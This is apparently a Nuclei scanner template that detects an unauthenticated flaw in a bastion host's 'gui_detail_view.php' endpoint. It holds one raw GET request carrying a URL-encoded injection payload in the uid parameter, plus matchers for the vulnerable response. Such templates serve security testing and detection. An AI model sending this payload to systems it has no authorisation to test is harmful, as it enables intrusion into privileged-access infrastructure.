id: qzsec-ris-acm-gui-detail-view-php-unauth
info:
  name: QZSEC RIS ACM GUI Detail View PHP Unauth
  author: Raiynin
  severity: high
  description: |
    This template detects an unauthenticated access vulnerability in the 'gui_detail_view.php' endpoint, exploiting it with a crafted SQL injection parameter.
  reference:
    - https://idc.wanyunshuju.com/aqld/2108.html
http:
  - raw:
      - |
        GET /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "堡垒机"
          - "错误的id"
